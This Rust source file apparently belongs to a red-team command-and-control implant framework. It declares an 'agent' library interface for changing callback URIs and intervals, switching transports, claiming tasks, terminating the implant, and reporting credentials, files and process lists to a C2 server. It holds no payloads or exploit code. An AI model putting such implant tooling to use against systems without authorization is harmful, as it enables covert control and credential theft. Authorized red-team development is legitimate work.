#![allow(clippy::mutable_key_type)]
extern crate alloc;

use alloc::string::String;
use alloc::vec::Vec;
use eldritch_core::Value;
use eldritch_macros::{eldritch_library, eldritch_method};

use alloc::collections::BTreeMap;

#[cfg(feature = "fake_bindings")]
pub mod fake;

#[cfg(feature = "stdlib")]
pub mod agent;
#[cfg(feature = "stdlib")]
pub mod conversion;
#[cfg(feature = "stdlib")]
pub mod std;

#[cfg(not(feature = "stdlib"))]
pub mod conversion_fake;

#[cfg(feature = "stdlib")]
use conversion::*;

#[cfg(not(feature = "stdlib"))]
use conversion_fake::*;

#[cfg(feature = "stdlib")]
pub use eldritch_agent::{Agent, ContextProvider, ReportContext, StaticContextProvider};

#[cfg(test)]
mod tests;

// Re-export wrappers so modules can use them (but they are internal to crate if not pub)
// Wait, `conversion` and `conversion_fake` define public structs.
// We need to make sure they are accessible.

#[eldritch_library("agent")]
/// The `agent` library provides capabilities for interacting with the agent's internal state, configuration, and task management.
///
/// It allows you to:
/// - Modify agent configuration (callback intervals, transports).
/// - Manage background tasks.
/// - Report data back to the C2 server (though the `report` library is often preferred for high-level reporting).
/// - Control agent execution (termination).
pub trait AgentLibrary {
    #[eldritch_method]
    /// **DANGER**: Terminates the agent process immediately.
    ///
    /// This method calls `std::process::exit(0)`, effectively killing the agent.
    /// Use with extreme caution.
    ///
    /// **Returns**
    /// - `None` (Does not return as the process exits).
    ///
    /// **Errors**
    /// - This function is unlikely to return an error, as it terminates the process.
    fn _terminate_this_process_clowntown(&self) -> Result<(), String>;

    #[eldritch_method]
    /// Returns the current configuration of the agent as a dictionary.
    ///
    /// **Returns**
    /// - `Dict<String, Value>`: A dictionary containing configuration keys and values.
    ///
    /// **Errors**
    /// - Returns an error string if the configuration cannot be retrieved or is not implemented.
    fn get_config(&self) -> Result<BTreeMap<String, Value>, String>;

    // Interactivity
    fn fetch_asset(&self, name: String) -> Result<Vec<u8>, String>;
    fn report_credential(&self, credential: CredentialWrapper) -> Result<(), String>;
    fn report_file(&self, file: FileWrapper) -> Result<(), String>;
    fn report_process_list(&self, list: ProcessListWrapper) -> Result<(), String>;
    fn report_task_output(&self, output: String, error: Option<String>) -> Result<(), String>;
    fn claim_tasks(&self) -> Result<Vec<TaskWrapper>, String>;

    // Agent Configuration
    #[eldritch_method]
    /// Returns the name of the currently active transport.
    ///
    /// **Returns**
    /// - `str`: The name of the transport (e.g., "http", "grpc").
    ///
    /// **Errors**
    /// - Returns an error string if the transport cannot be identified.
    fn get_transport(&self) -> Result<String, String>;

    #[eldritch_method]
    /// Returns a list of available transport names.
    ///
    /// **Returns**
    /// - `List<str>`: A list of transport names.
    ///
    /// **Errors**
    /// - Returns an error string if the list cannot be retrieved.
    fn list_transports(&self) -> Result<Vec<String>, String>;

    #[eldritch_method]
    /// Returns the current callback interval in seconds.
    ///
    /// **Returns**
    /// - `int`: The interval in seconds.
    ///
    /// **Errors**
    /// - Returns an error string if the interval cannot be retrieved.
    fn get_callback_interval(&self) -> Result<i64, String>;

    #[eldritch_method]
    /// Sets the callback interval for the agent.
    ///
    /// This configuration change is typically transient and may not persist across reboots.
    ///
    /// **Parameters**
    /// - `interval` (`int`): The new interval in seconds.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the interval cannot be set.
    fn set_callback_interval(&self, interval: i64) -> Result<(), String>;

    #[eldritch_method]
    /// Sets the active callback URI for the agent.
    ///
    /// **Parameters**
    /// - `uri` (`str`): The new URI to callback to
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the active callback uri cannot be set.
    fn set_callback_uri(&self, uri: String) -> Result<(), String>;

    // Task Management
    #[eldritch_method]
    /// Lists the currently running or queued background tasks on the agent.
    ///
    /// **Returns**
    /// - `List<Task>`: A list of task objects.
    ///
    /// **Errors**
    /// - Returns an error string if the task list cannot be retrieved.
    fn list_tasks(&self) -> Result<Vec<TaskWrapper>, String>;

    #[eldritch_method]
    /// Stops a specific background task by its ID.
    ///
    /// **Parameters**
    /// - `task_id` (`int`): The ID of the task to stop.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the task cannot be stopped or does not exist.
    fn stop_task(&self, task_id: i64) -> Result<(), String>;
}
